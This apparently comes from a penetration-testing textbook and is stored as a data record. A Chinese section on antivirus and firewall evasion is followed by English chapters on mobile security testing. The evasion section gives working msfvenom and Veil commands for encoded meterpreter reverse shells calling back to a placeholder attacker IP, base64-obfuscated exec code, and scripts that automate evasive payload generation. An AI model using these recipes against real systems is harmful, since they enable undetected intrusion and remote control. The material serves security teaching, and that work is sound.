  trans: "\n\n# 防病毒软件规避\n\n杀毒软件旨在根据已知的签名和可疑行为检测并拦截恶意软件。然而，混淆、载荷加密和多态性等技术可用于创建规避这些保护的恶意变体。\n\
    \n## 代码混淆\n混淆恶意代码使得杀毒检测引擎更难识别。这可以通过更改代码结构或对其进行加密来实现，同时不改变其功能。\n\n```python\nimport\
    \ base64\n\noriginal_code = \"malicious code\"\n\nencoded_code = base64.b64encode(original_code.encode('utf-8')).decode('utf-8')\n\
    \nexec(base64.b64decode(encoded_code).decode('utf-8'))\n```\n\n● 此 Python 脚本使用\
    \ `base64` 混淆恶意代码，使其难以被基于特征的杀毒软件检测。\n\n## 载荷加密\n加密恶意载荷使得病毒在执行之前难以检测内容。一旦加密，载荷会在执行时在内存中解密。\n\
    \n```bash\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444\
    \ -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe\n```\n\n● 使用 `msfvenom`，可以使用编码器\
    \ `x86/shikata_ga_nai` 创建加密载荷，该编码器已知可以规避杀毒检测。\n\n## 多态性\n多态性创建恶意软件的多个版本，每个版本的代码都有微小变化，但不影响其功能，增加了检测难度。多态工具在每次生成时都会以不同的方式重写恶意代码。\n\
    \n# 绕过防火墙和杀毒软件的工具\n\n已经开发了一些专门工具来帮助绕过防火墙和杀毒软件，允许攻击者在不被发现的情况下执行恶意活动。\n\n## Metasploit\
    \ Framework\nMetasploit 是利用漏洞和绕过防火墙、杀毒软件等安全防护的最强大且应用的工具之一。它提供了庞大的漏洞和载荷库，可以自定义以规避检测。\n\
    \n### 使用 Metasploit 创建规避性载荷\n```bash\nmsfvenom -p windows/x64/meterpreter/reverse_tcp\
    \ LHOST=attacker_ip LPORT=4444 -e x64/xor_dynamic -f exe -o evasive_payload.exe\n\
    ```\n● 此命令生成一个规避性载荷，使用编码器 `x64/xor_dynamic` 加密载荷，使其难以被杀毒软件检测。\n\n## Nmap 脚本引擎\
    \ (NSE)\nNmap 除了网络扫描能力外，还有一个 Nmap 脚本引擎 (`NSE`)，可以执行各种任务，包括绕过防火墙。\n\n### 使用 NSE\
    \ 绕过防火墙\n```bash\nnmap -p 80 --script http-waf-detect --script-args http-waf-detect.uri='/bypass'\
    \ target_ip\n```\n● 此命令使用 `NSE` 脚本检测 Web 应用防火墙 (WAF) 的存在并尝试识别绕过它的方法。\n\n## Veil\
    \ Framework\nVeil 是一种专门用于生成规避杀毒检测载荷的工具。它支持多种规避技术，包括加密、混淆和多态性。\n\n### 使用 Veil 生成规避性载荷\n\
    ```bash\nveil -p python/meterpreter/rev_tcp -c LHOST=attacker_ip LPORT=4444\n\
    ```\n● 此命令使用 `Veil` 生成一个 Python 载荷，配置为在不被检测的情况下回连接到攻击者的 IP。\n\n# 规避与绕过脚本\n\n自动化规避安全控制的过程可能非常有效，特别是在需要绕过多个防御机制的环境中。可以使用\
    \ Bash 和 Python 脚本来自动化规避性载荷的生成以及对防火墙和杀毒软件的绕过。\n\n## 使用 Bash 自动化防火墙规避\n自动化绕过防火墙的尝试可能涉及反复执行包分片和端口扫描等技术。\n\
    \n### 用于绕过防火墙的 Bash 脚本\n```bash\n#!/bin/bash\n\ntarget_ip=\"192.168.1.100\"\n\n\
    echo \"尝试使用分片包绕过防火墙...\"\n\nhping3 -S -p 80 -f $target_ip\n\necho \"尝试端口触发序列...\"\
    \n\nnmap -p 7000,8000,9000 -Pn --script=knock-knock --script-args=\"ports=7000,8000,9000\"\
    \ $target_ip\n```\n● 此脚本通过包分片和端口触发自动化绕过防火墙的尝试，这是绕过配置错误防火墙的两种有效方法。\n\n## 使用 Python\
    \ 自动化创建规避性载荷\n可以通过 Python 脚本自动生成规避性载荷，这些脚本集成了 `msfvenom` 等工具来创建规避杀毒的自定义载荷。\n\n\
    ```python\nimport subprocess\n\ndef generate_evasive_payload(lhost, lport, output_file):\n\
    \    command = [\n        \"msfvenom\", \"-p\", \"windows/x64/meterpreter/reverse_tcp\"\
    ,\n        f\"LHOST={lhost}\", f\"LPORT={lport}\",\n        \"-e\", \"x64/xor_dynamic\"\
    , \"-f\", \"exe\", \"-o\", output_file\n    ]\n    subprocess.run(command)\n \
    \   print(f\"载荷已生成: {output_file}\")\n\ngenerate_evasive_payload(\"192.168.1.100\"\
    , \"4444\", \"evasive_payload.exe\")\n```\n● 此脚本使用 `msfvenom` 自动化生成规避性载荷，使用编码\
    \ `xor_dynamic` 增加杀毒软件检测的难度。\n\n绕过防火墙和杀毒软件等安全控制需要结合高级技术、专用工具和有效的自动化。了解这些防御措施如何能被绕过，对于提高系统安全和进行真实的渗透测试都至关重要。像\
    \ Metasploit、`Nmap` 和 `Veil` 等工具，结合 Bash 和 Python 自定义脚本，提供了绕过防御和利用系统的强大能力。然而，掌握这些知识也意味着有责任以伦道德使用这些技术，并以加强网络安全为目标。\n\
    \n# 第 16 章：移动设备安全测试\n\n移动设备已变得无处不在，存储着大量的个人和公司信息，并在日常生活中起着关键作用。随着对智能手机和平板电脑依赖的增加，这些平台的安全性已成为首要任务。移动设备安全测试对于确保应用程序和操作系统免受从漏洞利用到数据泄露的各种威胁至关重要。本章探讨了在移动平台上执行安全测试所需的技巧、工具和脚本，主要关注\
    \ Android 和 iOS。\n\n## 移动平台安全分析\n\n移动设备上的安全分析涉及评估多个方面，包括操作系统的安全性、已安装应用程序的完整性以及实施的安全配置。这些设备的移动性，结合无线网络和云存储的广泛使用，使其特别容易受到攻击。因此，评估必须全面的，涵盖从开发环境到最终运行的所有环节。\n\
    \n## 操作系统安全\nAndroid 和 iOS 等移动操作系统是复杂的，提供了多种内置安全功能。然而，这些系统也存在可攻击者利用的漏洞。\n\n● Android：Android\
    \ 作为一个开源操作系统提供了更大的灵活性，但由于碎片化和从外部源安装应用程序的可能性，也带来了更大的安全风险。你的 Android 安全评估应关注应用权限、沙箱配置和安全更新。\n\
    \n● iOS：另一方面，iOS 以其封闭的生态系统和对可安装应用程序的更强控制闻名。然而，即使有这些限制，漏洞仍然可以被利用，特别是在“越狱”的设备上。iOS\
    \ 安全审查应包含沙箱策略、密钥管理和隐私设置。\n\n## 移动应用评估\n移动应用程序是漏洞的主要来源之一。评估应包括源代码分析、权限审查以及应用程序所使用的\
    \ API 的安全测试。\n\n"
- fmt: "\n# Static Analysis\nStatic analysis involves reviewing the application's\
    \ source code or packaging to identify potential vulnerabilities, such as improper\
    \ storage of sensitive data or exposure of cryptographic keys. Tools like `MobSF`\
    \ (Mobile Security Framework) are useful for performing automated static analysis.\n\
    \n```bash\npython3 manage.py runserver\n```\n- This command starts the `MobSF`\
    \ server, allowing analysis of Android and iOS applications.\n\n# Dynamic Analysis\n\
    Dynamic analysis observes application behavior in real time as it runs on a device\
    \ or emulator. This may include monitoring network traffic, analyzing logs, and\
    \ identifying insecure interactions with the operating system.\n\n# Security Settings\n\
    Device security settings such as encryption, authentication, and update management\
    \ play a crucial role in protecting against attacks. Poorly configured devices\
    \ are easy targets for attackers.\n\n- **Cryptography**: Verifying that data encryption\
    \ at rest and in transit is enabled and correctly implemented is essential. On\
    \ Android, full disk encryption can be reviewed in the security settings.\n- **Authentication**:\
    \ Mobile devices must require robust authentication, such as PINs, strong passwords,\
    \ or biometric authentication. The analysis must confirm that authentication methods\
    \ are adequate and that there are no possible bypasses.\n\n# Tools for Pentest\
    \ on Android and iOS\nPerforming pen tests on mobile devices requires the use\
    \ of specialized tools that can handle the particularities of Android and iOS\
    \ platforms. These tools help identify vulnerabilities and test the effectiveness\
    \ of implemented defenses.\n\n## Android Tools\n**Drozer**: `Drozer` is a powerful\
    \ tool for Android pentesting, allowing the exploitation of vulnerabilities in\
    \ installed applications and the Android environment. It can be used to exploit\
    \ failures in components such as activities, services and broadcast receivers.\n\
    \n```bash\ndrozer console connect\nrun app.package.list\nrun app.activity.info\
    \ -a com.example.app/.MainActivity\n```\n- These commands connect to an Android\
    \ device and list installed application packages and provide detailed information\
    \ about specific activities.\n\n**APKTool**: `APKTool` allows the disassembly\
    \ of APK files, enabling detailed analysis of Android application code. This is\
    \ useful for identifying hardcodings, cryptographic keys, and other vulnerabilities\
    \ in the source code.\n\n```bash\napktool d application.apk\n```\n- This command\
    \ disassembles the `APK` file, allowing analysis of the source code.\n\n## iOS\
    \ Tools\n**Frida**: `Frida` is a dynamic instrumentation tool that allows you\
    \ to inject scripts into iOS apps in real time, which is useful for testing app\
    \ security without having to change the source code.\n\n```bash\nfrida -U -n Safari\
    \ -l script.js\n```\n- This command injects a JavaScript script into an active\
    \ application process on the iOS device.\n\n**Objection**: `Objection` is a tool\
    \ that facilitates the exploration of iOS and Android applications, allowing you\
    \ to perform security tests on applications that use advanced security techniques,\
    \ such as debug protection.\n\n```bash\nobjection --gadget com.example.app explore\n\
    ```\n- This command connects to an app running on iOS, allowing interactive exploration.\n\
    \n# Scripts and Automation for Mobile Testing\nAutomating security testing on\
    \ mobile devices can increase testing efficiency and coverage, allowing pentesters\
    \ to identify vulnerabilities faster and more consistently.\n\n### Test Automation\
    \ with Bash and ADB\nAndroid Debug Bridge (`ADB`) is a versatile tool that can\
    \ be used to automate a variety of tasks on Android devices, from installing apps\
    \ to extracting logs and files.\n\n### Bash Script for Test Automation on Android\n\
    ```bash\n#!/bin/bash\ndevice_ip=\"192.168.1.101\"\napk_path=\"/path/to/application.apk\"\
    \necho \"Connecting to Android device at $device_ip...\"\nadb connect $device_ip\n\
    echo \"Installing APK...\"\nadb install $apk_path\necho \"Extracting logs...\"\
    \nadb logcat -d > logs.txt\necho \"Uninstalling APK...\"\nadb uninstall com.example.app\n\
    echo \"Test completed. Logs saved to logs.txt.\"\n```\n- This script automates\
    \ the installation and uninstallation of an `APK` and extracts logs for later\
    \ analysis.\n\n### Dynamic Analysis Automation with Frida and Python\nPython scripts,\
    \ combined with `Frida`, can be used to automate the dynamic analysis of iOS applications,\
    \ allowing the interception and modification of function calls and other application\
    \ behaviors.\n\n### Python Script for Dynamic Analysis with Frida\n```python\n\
    import frida\nimport sys\n\ndef on_message(message, data):\n    print(f\"[{message['type']}]\
    \ {message['payload']}\")\n\nsession = frida.get_usb_device().attach(\"com.example.app\"\
    )\nscript = session.create_script(\"\"\"\nInterceptor.attach(Module.findExportByName(null,\
    \ 'open'), {\n    onEnter: function(args) {\n        send('open called with: '\
    \ + Memory.readCString(args[0]));\n    }\n});\n\"\"\")\nscript.on('message', on_message)\n\
    script.load()\nsys.stdin.read()\n```\n- This script intercepts calls to the function\
    \ `open` in an iOS app, displaying the path of files accessed by the app in real\
    \ time.\n\n### Security Test Automation with MobSF\n`MobSF` can be configured\
    \ to perform automated static and dynamic analysis on batches of applications,\
    \ enabling efficient analysis of large volumes of software.\n\n### Automation\
    \ with MobSF API\n```python\nimport requests\nfiles = {'file': open('application.apk',\
    \ 'rb')}\nresponse = requests.post('http://localhost:8000/api/v1/upload', files=files)\n\
    print(response.json())\n```\n- This Python script uploads an `APK` to `MobSF`,\
    \ automatically starting the analysis and returning the results.\n\nMobile security\
    \ testing is a vital part of modern cybersecurity, given the central role these\
    \ devices play in personal and professional lives. Security analysis on mobile\
    \ platforms, supported by powerful tools like `Drozer`, `Frida`, and `MobSF`,\
    \ combined with automation through scripts in `Bash` and `Python`, allows pentesters\
    \ to perform in-depth and comprehensive assessments. Ensuring these devices are\
    \ protected against emerging threats is essential for maintaining the confidentiality,\
    \ integrity and availability of data stored and processed on mobile devices.\n\
    \n# Chapter 17: Test Automation with Scripts and Tools\n\nAutomation plays a key\
    \ role in the penetration testing process, allowing repetitive tasks to be performed\
    \ efficiently and consistently. Using custom scripts and automation tools not\
    \ only speeds up the pen testing process, but also improves test coverage and\
    \ accuracy, allowing vulnerabilities to be identified more effectively. Automation\
    \ enables pentesters to focus their efforts on more complex and creative analyses,\
    \ leaving operational tasks to well-designed scripts.\n\n## Using Custom Scripts\
    \ in Penetration Testing\nCustom scripts are the backbone of automation in penetration\
    \ testing. They allow pentesters to adapt tools and processes according to the\
    \ specific needs of each test, increasing the flexibility and effectiveness of\
    \ security assessment.\n\n### Scripts em Bash\n`Bash` is one of the most used\
    \ scripting languages in Unix-like environments, including `Kali Linux`. Its simplicity\
    \ and integration with the operating system make it ideal for automating pentest\
    \ tasks, from network scanning to vulnerability exploitation.\n\n### Network Scan\
    \ Automation\nNetwork scanning is one of the first steps of a penetration test.\
    \ Automating this task with `Bash` can save time and ensure that all ports and\
    \ services are thoroughly examined.\n\n```bash\n#!/bin/bash\ntarget_ip=\"192.168.1.1\"\
    \noutput_file=\"scan_results.txt\"\necho \"Starting network scan on $target_ip...\"\
    \nnmap -sS -p- -oN $output_file $target_ip\necho \"Scan completed. Results saved\
    \ to $output_file.\"\n```\n- This script performs a full port scan on a specific\
    \ target, saving the results to a file for later analysis.\n\n### Scripts em Python\n\
    `Python` offers greater flexibility and power compared to `Bash`, especially for\
    \ tasks that involve data processing or integration with APIs. It is widely used\
    \ in pen testing to automate complex tasks and create custom tools.\n"
